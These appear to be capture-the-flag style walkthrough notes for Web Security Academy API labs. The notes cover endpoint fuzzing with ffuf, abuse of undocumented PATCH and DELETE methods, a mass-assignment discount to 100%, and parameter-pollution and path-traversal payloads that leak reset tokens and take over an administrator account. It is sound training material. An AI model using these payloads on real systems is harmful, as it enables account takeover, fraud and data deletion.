# Navigation
- [Exploiting an API endpoint using documentation](#exploiting-an-api-endpoint-using-documentation)
- [Finding and exploiting an unused API endpoint](#finding-and-exploiting-an-unused-api-endpoint)
- [Exploiting a mass assignment vulnerability](#exploiting-a-mass-assignment-vulnerability)
- [Exploiting server-side parameter pollution in a query string](#exploiting-server-side-parameter-pollution-in-a-query-string)
- [Exploiting server-side parameter pollution in a REST URL](#exploiting-server-side-parameter-pollution-in-a-rest-url)
# Exploiting an API endpoint using documentation
- Find exposed API documentation and delete `carlos`
- Login using `wiener:peter`
1. Fuzz for the API endpoint
```sh
ffuf -u https://0a69002c04e075f580fa9955005800ae.web-security-academy.net/FUZZ -w api-documentation-endpoint1.txt
```
- Wordlist from [here](https://github.com/z5jt/API-documentation-Wordlist/blob/main/API-Documentation-Wordlist/api-documentation-endpoint1.txt)
2. Identified endpoint `/api/openapi.json`
3. Make a request to discovered endpoint and we get the JSON body telling us what the API can do
4. Make a request specifying usernames to get their information
```HTTP
GET /api/user/carlos HTTP/2
Host: 0a69002c04e075f580fa9955005800ae.web-security-academy.net
```
- Disclosed username and email
5. Further down the openapi description, there is a DELETE method that can be used and also a JSON body that requires the username and email to perform the operation
6. Submit a request to delete the carlos user
```http
DELETE /api/user/carlos HTTP/2
Host: 0a69002c04e075f580fa9955005800ae.web-security-academy.net
...<SNIP>...
{"username":"carlos","email":"carlos@carlos-montoya.net"}
```
# Finding and exploiting an unused API endpoint
- Exploit hidden API endpoint to buy a **lightweight l33t leather jacket**
- Login using `wiener:peter`
1. Authenticate
2. View home page and select the "l33t" jacket
3. Identify GET request made to API
```http
# Request
GET /api/products/1/price

# Response
HTTP/2 200 OK

{"price":"$1337.00","message":"20 people are watching this item right now"}
```
4. Change request method to `OPTIONS` and we get an `Allow` header in the response disclosing that `PATCH` can be used
```HTTP
# Request
OPTIONS /api/products/1/price

# Response
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
```
5. Submitting `PATCH` request tells us that only JSON is supported in the HTTP body, send a request doing so
	1. Submitting with empty body returns 500 error
6. Provide the "price" key in the JSON body to control the cost
```http
# Request
PATCH /api/products/1/price
Content-Type: application/json

{"price":1}

# Response
HTTP/2 200 OK

{"price":"$0.01"}
```
7. Controlling the price, set it to zero
8. Purchase a "l33t" jacket
# Exploiting a mass assignment vulnerability
- Exploit mass assignment to buy a **lightweight l33t leather jacket**
- Login using `wiener:peter`
1. Authenticate
2. Use `ffuf` to discover `/api` endpoint
```sh
ffuf -u https://0ae3005403eec13d81922a4e00d10085.web-security-academy.net/FUZZ -w wordlists/API/api-documentation-endpoint1.txt
```
- Wordlist from [here](https://github.com/z5jt/API-documentation-Wordlist/blob/main/API-Documentation-Wordlist/api-documentation-endpoint1.txt)
3. `/api` discloses a POST and GET `/checkout` endpoint
- GET
```HTTP
# Response
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8

{"chosen_discount":{"percentage":0},"chosen_products":[]}
```
- POST
```http
# Request
POST /api/checkout

{"chosen_products":[]}

# Response
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
```
4. Add a "l33t" jacket to the cart
5. Go back to the `/api/checkout` endpoint and send the GET request and copy the JSON body
```json
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```
6. Make a POST request to the `/api/checkout` endpoint using the JSON body from above and change the discount percentage to `100`
```JSON
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
```
- Response from server
```http
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
```
# Exploiting server-side parameter pollution in a query string
- Log in as `administrator` and delete `carlos`
1. Login > Forgot password
2. Enter administrator and submit > Send request to repeater
	1. Notice that the HTTP response in burp returns JSON data, this looks like an API
3. Submit username that does not exist `username=does_not_exist` and get error message like so
```json
{"type":"ClientError","code":400,"error":"Invalid username."}
```
4. Submit URL encoded `#` (`username=administrator%23foo`) and receive a different error message showing our query is truncated
```JSON
{"error": "Field not specified."}
```
5. Injecting invalid parameter gives us a different error message (`username=administrator%26foo=xyz`)
```JSON
{"error": "Parameter is not supported."}
```
- We know that we can inject parameters into the forgot password POST body
6. Fuzz parameters using Burp parameter names from SecLists `username=administrator%26foo=xyz`
	- Fuzz the `foo` part
7. Get a different response for `field`
8. Submit a request using `field` as a valid parameter (`username=administrator%26field=xyz`) but nothing useful and we get errors like so
```json
{"type":"ClientError","code":400,"error":"Invalid field."}
```
9. Checking sitemap on Burp we see a JavaScript file `forgotPassword.js` which shows the following
```javascript
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
```
- We see a URL parameter called `reset-token`
- This `reset-token` can be used at `/forgot-password?reset_token=...`
10. Inject a valid parameter `field` and use `reset_token` as the value (`username=administrator%26field=reset_token`) to get the following response
```json
{"type":"reset_token","result":"nzxrhg8q15vwntlry1stoiux16al9qoj"}
```
11. Navigate to password reset URL
```
https://0a2e00840423b8e681b32fdd002f0048.web-security-academy.net/forgot-password?reset_token=nzxrhg8q15vwntlry1stoiux16al9qoj
```
12. Reset password
13. Login as administrator
14. Delete carlos
# Exploiting server-side parameter pollution in a REST URL
- Log in as `administrator` and delete `carlos`
1. Forgot password function
2. Inject directory traversal into the username field
```
username=administrator%2f..%2fadministrator
```
- We get username result indicating we can successfully inject path traversal
3. Truncating the request causes a 404 error (`username=administrator%2f..%2fadministrator%23`)
```JSON
{
  "type": "error",
  "result": "Invalid route. Please refer to the API definition"
}
```
4. Directory traverse to web root and we get a different error (`username=administrator%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f`)
```json
{
  "error": "Unexpected response from API server:\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Not Found<\/title>\n<\/head>\n<body>\n    <h1>Not found<\/h1>\n    <p>The URL that you requested was not found.<\/p>\n<\/body>\n<\/html>\n"
}
```
5. Fuzz for API documentation using intruder with the API documentation wordlist
- Remember to include the URL fragment at the end of your payload
- We get a successful hit for `openapi.json` - (`username=administrator%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fopenapi.json%23`)
```json
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```
- This basically tells us we can interact with the path `/api/internal/v1/users/{username}/field/{field}`
6. `forgotPassword.js` file reveals some information about a potentially interesting field name
```javascript
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?passwordResetToken=${resetToken}`;
    }
```
7. First payload returns error (`username=administrator%2ffield%2fpasswordResetToken%23`)
```json
{
  "type": "error",
  "result": "This version of API only supports the email field for security reasons"
}
```
8. Use directory traversal and specify the exact path (`username=administrator%2f..%2f..%2f..%2f..%2f..%2fapi%2finternal%2fv1%2fusers%2fadministrator%2ffield%2fpasswordResetToken%23`)
```json
{
  "type": "passwordResetToken",
  "result": "ikd1pqpebrgbn719plgeksljjbm38bdd"
}
```
9. Navigate to password reset URL
10. Change administrator's password
11. Login > Delete carlos
